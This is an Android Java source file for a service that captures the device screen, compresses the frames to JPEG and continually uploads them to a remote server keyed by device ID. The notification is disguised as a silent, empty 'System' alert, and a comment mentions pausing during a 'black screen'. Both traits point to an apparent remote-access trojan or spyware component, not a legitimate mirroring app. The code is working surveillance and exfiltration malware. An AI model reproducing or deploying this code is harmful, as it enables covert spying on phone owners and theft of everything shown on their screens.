package com.panellord;

import android.app.Activity;
import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class ScreenMirrorService extends Service {
    private static final String TAG = "ScreenMirrorService";
    public static final String ACTION_START      = "com.panellord.SCREEN_START";
    public static final String ACTION_STOP       = "com.panellord.SCREEN_STOP";
    public static final String EXTRA_RESULT_CODE = "result_code";
    public static final String EXTRA_DATA        = "data";

    private static volatile boolean running = false;
    private static volatile boolean paused  = false;

    /** Pause/resume frame uploads (e.g. while black screen is active) */
    public static void setPaused(boolean p) { paused = p; }

    private MediaProjection          mediaProjection;
    private VirtualDisplay           virtualDisplay;
    private ImageReader              imageReader;
    private ScheduledExecutorService scheduler;
    private ScheduledFuture<?>       frameTask;
    private String                   deviceId;
    private int screenWidth, screenHeight, captureW, captureH, screenDpi;
    private final AtomicBoolean uploading = new AtomicBoolean(false);

    public static boolean isRunning() { return running; }

    @Override
    public void onCreate() {
        super.onCreate();
        running  = true;
        deviceId = DeviceIdManager.getDeviceId(this);
        DisplayMetrics m = new DisplayMetrics();
        ((WindowManager) getSystemService(WINDOW_SERVICE))
            .getDefaultDisplay().getMetrics(m);
        screenWidth  = m.widthPixels;
        screenHeight = m.heightPixels;
        screenDpi    = m.densityDpi;
        // HALF resolution → 4× fewer pixels → much faster encode + upload
        captureW     = screenWidth  / 2;
        captureH     = screenHeight / 2;
        scheduler    = Executors.newSingleThreadScheduledExecutor();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        if (ACTION_START.equals(intent.getAction())) {
            int resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED);
            Intent data    = intent.getParcelableExtra(EXTRA_DATA);

            startForeground(Config.NOTIF_ID_SCREEN, buildSilentNotif());

            MediaProjectionManager mpm =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            mediaProjection = mpm.getMediaProjection(resultCode, data);

            imageReader    = ImageReader.newInstance(captureW, captureH,
                PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "SvcDisplay", captureW, captureH, screenDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

            frameTask = scheduler.scheduleAtFixedRate(
                this::captureAndUpload,
                200, Config.SCREEN_FRAME_INTERVAL_MS, TimeUnit.MILLISECONDS);

            Log.d(TAG, "Screen started " + captureW + "x" + captureH
                + " @" + Config.SCREEN_FRAME_INTERVAL_MS + "ms q=" + Config.SCREEN_JPEG_QUALITY);

        } else if (ACTION_STOP.equals(intent.getAction())) {
            stopCapture();
            stopSelf();
        }
        return START_NOT_STICKY;
    }

    private void captureAndUpload() {
        if (paused) return;                              // paused (e.g. black screen active)
        if (!uploading.compareAndSet(false, true)) return; // skip frame if busy

        Image image = null;
        try {
            image = imageReader.acquireLatestImage();
            if (image == null) { uploading.set(false); return; }

            Image.Plane[] planes     = image.getPlanes();
            ByteBuffer    buf        = planes[0].getBuffer();
            int           rowStride  = planes[0].getRowStride();
            int           pixelStride = planes[0].getPixelStride();
            int           w = image.getWidth(), h = image.getHeight();

            Bitmap bmp = Bitmap.createBitmap(rowStride / pixelStride, h, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);
            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);
            bmp.recycle();

            ByteArrayOutputStream baos = new ByteArrayOutputStream(16 * 1024);
            cropped.compress(Bitmap.CompressFormat.JPEG, Config.SCREEN_JPEG_QUALITY, baos);
            cropped.recycle();

            uploadFrame(baos.toByteArray());
        } catch (Exception e) {
            Log.w(TAG, "Capture: " + e.getMessage());
        } finally {
            if (image != null) try { image.close(); } catch (Exception ignored) {}
            uploading.set(false);
        }
    }

    private void uploadFrame(byte[] jpeg) {
        try {
            URL url = new URL(Config.VPS_URL + "/screen-frame/" + deviceId);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(800);
            c.setReadTimeout(800);
            c.setFixedLengthStreamingMode(jpeg.length); // avoid chunked transfer, no buffering
            c.setRequestProperty("Content-Type",  "image/jpeg");
            c.setRequestProperty("Content-Length", String.valueOf(jpeg.length));
            c.setRequestProperty("Connection",    "keep-alive");
            c.setRequestProperty("X-Token",       Config.USER_TOKEN);
            c.setRequestProperty("X-Screen-W",    String.valueOf(screenWidth));
            c.setRequestProperty("X-Screen-H",    String.valueOf(screenHeight));
            OutputStream os = c.getOutputStream();
            os.write(jpeg);
            os.flush();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception e) {
            Log.w(TAG, "Upload: " + e.getMessage());
        }
    }

    private void stopCapture() {
        if (frameTask != null)      { frameTask.cancel(true);  frameTask = null; }
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (mediaProjection != null){ mediaProjection.stop();  mediaProjection = null; }
        if (imageReader != null)    { imageReader.close();     imageReader = null; }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        stopCapture();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    private Notification buildSilentNotif() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, Config.NOTIF_CHANNEL);
        } else {
            b = new Notification.Builder(this).setPriority(Notification.PRIORITY_MIN);
        }
        return b.setContentTitle("System")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
    }
}
